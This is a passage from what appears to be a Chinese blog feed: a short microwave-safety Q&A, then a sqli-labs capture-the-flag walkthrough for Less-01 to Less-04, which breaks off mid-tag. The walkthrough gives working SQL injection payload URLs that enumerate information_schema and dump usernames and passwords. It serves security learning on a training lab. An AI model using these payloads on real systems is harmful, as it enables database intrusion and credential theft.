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"></p>              </div>            </details><h4 id="微波炉加热食物会产生致癌物质？"><a href="#微波炉加热食物会产生致癌物质？" class="headerlink" title="微波炉加热食物会产生致癌物质？"></a>微波炉加热食物会产生致癌物质？</h4><details ><summary> 点击查看答案 </summary>              <div class='content'>              <p>想知道是否致癌，得从微波炉加热的本质说起</p><p>微波炉加热的其实是食物中的水。当微波辐射到食品上时，水的极性分子的取向将随微波场而变动。由于食品中水的极性分子的这种运动，以及相邻分子间的相互作用，产生了焦耳热，从而加热食物，所以微波炉加热不会产生致癌物质</p><p><img src="https://tse3-mm.cn.bing.net/th/id/OIP-C.MaWsOVDOBoaHx1GHXuEeTwHaHa?w=192&h=191&c=7&r=0&o=5&dpr=1.5&pid=1.7" class="lazyload" data-srcset="https://tse3-mm.cn.bing.net/th/id/OIP-C.MaWsOVDOBoaHx1GHXuEeTwHaHa?w=192&h=191&c=7&r=0&o=5&dpr=1.5&pid=1.7" srcset="data:image/png;base64,666"></p>              </div>            </details><h4 id="微波炉门的那块可视窗口部分有洞，会不会产生辐射呢？"><a href="#微波炉门的那块可视窗口部分有洞，会不会产生辐射呢？" class="headerlink" title="微波炉门的那块可视窗口部分有洞，会不会产生辐射呢？"></a>微波炉门的那块可视窗口部分有洞，会不会产生辐射呢？</h4><details ><summary> 点击查看答案 </summary>              <div class='content'>              <p>来人，上公式</p><p><a href="https://www.helloimg.com/image/Ga0UZo"><img src="https://www.helloimg.com/images/2021/12/01/Ga0UZo.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/01/Ga0UZo.png" srcset="data:image/png;base64,666" alt="Ga0UZo.png"></a></p><p>可以看出微波的波长大概在12cm左右，比微波炉门上的小洞直径大得多，微波根本出不来</p><p><a href="https://www.helloimg.com/image/Ga0fct"><img src="https://www.helloimg.com/images/2021/12/01/Ga0fct.jpg" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/01/Ga0fct.jpg" srcset="data:image/png;base64,666" alt="Ga0fct.jpg"></a></p>              </div>            </details><h4 id="微波炉加热的食品，会不会改变食品本身的营养成分？"><a href="#微波炉加热的食品，会不会改变食品本身的营养成分？" class="headerlink" title="微波炉加热的食品，会不会改变食品本身的营养成分？"></a>微波炉加热的食品，会不会改变食品本身的营养成分？</h4><details ><summary> 点击查看答案 </summary>              <div class='content'>              <p>我们要明白的是：任何形式的烹饪都会破坏食物中的营养成分，但关键的变量是烹饪中所用水的多少，烹饪的时间，以及温度。</p><p>正常的微波烹饪由于时间短，避免了传统烹饪中食物表面温度过高的弊端，油烟更少，所以产生的致癌物也更少。而且，在烹饪方法中，微波炉加热对食品营养成分的保护是属于比较好的，“能最大限度地保留食品的营养及原有的色香味”。</p>              </div>            </details><blockquote><p>资料参考：</p><p><a href="http://tech.sina.com.cn/e/2017-11-29/doc-ifypapmz6013246.shtml">求真测试：微波炉辐射大？比手机大多了|食品|微波炉|微波_新浪科技_新浪网 (sina.com.cn)</a></p><p><a href="https://post.smzdm.com/p/584186/">老爸评测：让我们谈谈关于微波炉的辐射问题_微波炉_什么值得买 (smzdm.com)</a></p><p>部分图源必应，侵删</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> other </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqli-labs</title>
      <link href="2021/11/30/sqli-labs/"/>
      <url>2021/11/30/sqli-labs/</url>
      
        <content type="html"><![CDATA[<blockquote><p>用校园网可能不能成功发送payload，切记！！！</p></blockquote><a id="more"></a><h2 id="Less-01"><a href="#Less-01" class="headerlink" title="Less-01"></a>Less-01</h2><ul><li><p>先判断是字符型注入还是数字型注入</p><p><img src="https://www.helloimg.com/images/2021/11/30/Ga9XGq.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/30/Ga9XGq.png" srcset="data:image/png;base64,666" alt="Ga9XGq.png"></p></li></ul><p><strong><em>payload：<a href="http://8ac8c2ec-ac49-4043-98a6-ebb1506ca92f.node4.buuoj.cn/Less-1/?id=1">http://8ac8c2ec-ac49-4043-98a6-ebb1506ca92f.node4.buuoj.cn/Less-1/?id=1</a> and 1=2–+</em></strong></p><hr><ul><li><p>再判断注入点</p><p><img src="https://www.helloimg.com/images/2021/11/30/Ga9m9b.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/30/Ga9m9b.png" srcset="data:image/png;base64,666" alt="Ga9m9b.png"></p></li></ul><p><strong><em>payload：<a href="http://8ac8c2ec-ac49-4043-98a6-ebb1506ca92f.node4.buuoj.cn/Less-1/?id=-1&#39;">http://8ac8c2ec-ac49-4043-98a6-ebb1506ca92f.node4.buuoj.cn/Less-1/?id=-1&#39;</a> union select 1,2,3–+</em></strong></p><hr><ul><li><p>查看数据库名称</p><p><img src="https://www.helloimg.com/images/2021/11/30/Ga9sko.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/30/Ga9sko.png" srcset="data:image/png;base64,666" alt="Ga9sko.png"></p></li></ul><p><strong><em>payload：<a href="http://8ac8c2ec-ac49-4043-98a6-ebb1506ca92f.node4.buuoj.cn/Less-1/?id=-1&#39;">http://8ac8c2ec-ac49-4043-98a6-ebb1506ca92f.node4.buuoj.cn/Less-1/?id=-1&#39;</a> union select 1,database(),3–+</em></strong></p><hr><ul><li><p>查看库中的表</p><p><img src="https://www.helloimg.com/images/2021/11/30/Ga9q0T.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/30/Ga9q0T.png" srcset="data:image/png;base64,666" alt="Ga9q0T.png"></p></li></ul><p><strong><em>payload：<a href="http://8ac8c2ec-ac49-4043-98a6-ebb1506ca92f.node4.buuoj.cn/Less-1/?id=-1&#39;">http://8ac8c2ec-ac49-4043-98a6-ebb1506ca92f.node4.buuoj.cn/Less-1/?id=-1&#39;</a> union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=”security”–+</em></strong></p><hr><ul><li><p>查看用户表中字段</p><p><img src="https://www.helloimg.com/images/2021/11/30/Ga9e4r.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/30/Ga9e4r.png" srcset="data:image/png;base64,666" alt="Ga9e4r.png"></p></li></ul><p><strong><em>payload：<a href="http://8ac8c2ec-ac49-4043-98a6-ebb1506ca92f.node4.buuoj.cn/Less-1/?id=-1&#39;">http://8ac8c2ec-ac49-4043-98a6-ebb1506ca92f.node4.buuoj.cn/Less-1/?id=-1&#39;</a> union select 1,group_concat(column_name),3 from information_schema.columns where table_name=”users”–+</em></strong></p><hr><ul><li><p>查看用户名和密码</p><p><img src="https://www.helloimg.com/images/2021/11/30/Ga9JxK.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/30/Ga9JxK.png" srcset="data:image/png;base64,666" alt="Ga9JxK.png"></p></li></ul><p><strong><em>payload：<a href="http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-1/?id=-1&#39;">http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-1/?id=-1&#39;</a> union select 1,group_concat(username,password),3 from security.users–+</em></strong></p><hr><ul><li><p>换个方式显示</p><p><img src="https://www.helloimg.com/images/2021/11/30/Ga9xj1.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/30/Ga9xj1.png" srcset="data:image/png;base64,666" alt="Ga9xj1.png"></p></li></ul><p><strong><em>payload：<a href="http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-1/?id=-1&#39;">http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-1/?id=-1&#39;</a> union select 1,group_concat(username),group_concat(password) from security.users–+</em></strong></p><hr><h2 id="Less-02"><a href="#Less-02" class="headerlink" title="Less-02"></a>Less-02</h2><ul><li><p>判断是数字型注入还是字符型注入</p><p><img src="https://www.helloimg.com/images/2021/11/30/Ga9MEE.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/30/Ga9MEE.png" srcset="data:image/png;base64,666"></p></li></ul><p><strong><em>payload：<a href="http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-2/?id=3-1">http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-2/?id=3-1</a></em></strong></p><hr><ul><li><p>判断注入点</p><p><img src="https://www.helloimg.com/images/2021/11/30/Ga9H0u.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/30/Ga9H0u.png" srcset="data:image/png;base64,666" alt="Ga9H0u.png"></p></li></ul><p><strong><em>payload：<a href="http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-2/?id=-1%20union%20select%201,2,3--+">http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-2/?id=-1%20union%20select%201,2,3--+</a></em></strong></p><hr><ul><li><p>往下操作与第一题类似，payload就差了一个单引号</p><p><img src="https://www.helloimg.com/images/2021/11/30/Ga9bjv.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/30/Ga9bjv.png" srcset="data:image/png;base64,666" alt="Ga9bjv.png"></p></li></ul><p><strong><em>payload：<a href="http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-2/?id=-1%20union%20select%201,group_concat(username),group_concat(password)%20from%20security.users--+">http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-2/?id=-1%20union%20select%201,group_concat(username),group_concat(password)%20from%20security.users--+</a></em></strong></p><hr><h2 id="Less-03"><a href="#Less-03" class="headerlink" title="Less-03"></a>Less-03</h2><ul><li><p>判断为字符型注入还是数字型注入</p><p><img src="https://www.helloimg.com/images/2021/11/30/Ga9NuR.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/30/Ga9NuR.png" srcset="data:image/png;base64,666" alt="Ga9NuR.png"></p></li></ul><p><strong><em>payload：<a href="http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-3/?id=2-1">http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-3/?id=2-1</a></em></strong></p><hr><ul><li><p>该题为字符型注入，但直接使用联合注入报错</p><p><img src="https://www.helloimg.com/images/2021/11/30/Ga90Nn.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/30/Ga90Nn.png" srcset="data:image/png;base64,666" alt="Ga90Nn.png"></p></li></ul><p><strong><em>payload：<a href="http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-3/?id=-2%27%20union%20select%201,2,3--+">http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-3/?id=-2%27%20union%20select%201,2,3--+</a></em></strong></p><hr><ul><li><p>根据题目提示，在id表示的数据及引号后加上括号，再进行联合注入，注入成功</p><p><img src="https://www.helloimg.com/images/2021/11/30/Ga9vRP.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/30/Ga9vRP.png" srcset="data:image/png;base64,666" alt="Ga9vRP.png"></p></li></ul><p><strong><em>payload：<a href="http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-3/?id=-2%27)%20union%20select%201,2,3--+">http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-3/?id=-2%27)%20union%20select%201,2,3--+</a></em></strong></p><hr><ul><li><p>往下与第一题相同，union后的payload一致</p><p><img src="https://www.helloimg.com/images/2021/11/30/Ga9wA6.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/30/Ga9wA6.png" srcset="data:image/png;base64,666" alt="Ga9wA6.png"></p></li></ul><p><strong><em>payload：<a href="http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-3/?id=-2%27)%20union%20select%201,group_concat(username),group_concat(password)%20from%20security.users--+">http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-3/?id=-2%27)%20union%20select%201,group_concat(username),group_concat(password)%20from%20security.users--+</a></em></strong></p><hr><h2 id="Less-04"><a href="#Less-04" class="headerlink" title="Less-04"></a>Less-04</h2><ul><li><p>判断为字符型注入还是数字型注入</p><p><img src="https://www.helloimg.com/images/2021/11/30/Ga98Ih.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/30/Ga98Ih.png" srcset="data:image/png;base64,666" alt="Ga98Ih.png"></p></li></ul><p><strong><em>payload：<a href="http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-4/?id=2-1">http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-4/?id=2-1</a></em></strong></p><hr><ul><li><p>使用单引号进行闭合，报错</p><p><img src="https://www.helloimg.com/images/2021/11/30/Ga9I10.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/30/Ga9I10.png" srcset="data:image/png;base64,666" alt="Ga9I10.png"></p></li></ul><p><strong><em>payload：<a href="http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-4/?id=-1%27%20union%20select%201,2,3--+">http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-4/?id=-1%27%20union%20select%201,2,3--+</a></em></strong></p><hr><ul><li><p>组合单引号、双引号以及括号得到注入点</p><p><img src="https://www.helloimg.com/images/2021/11/30/Ga97r5.png" class="lazyload" 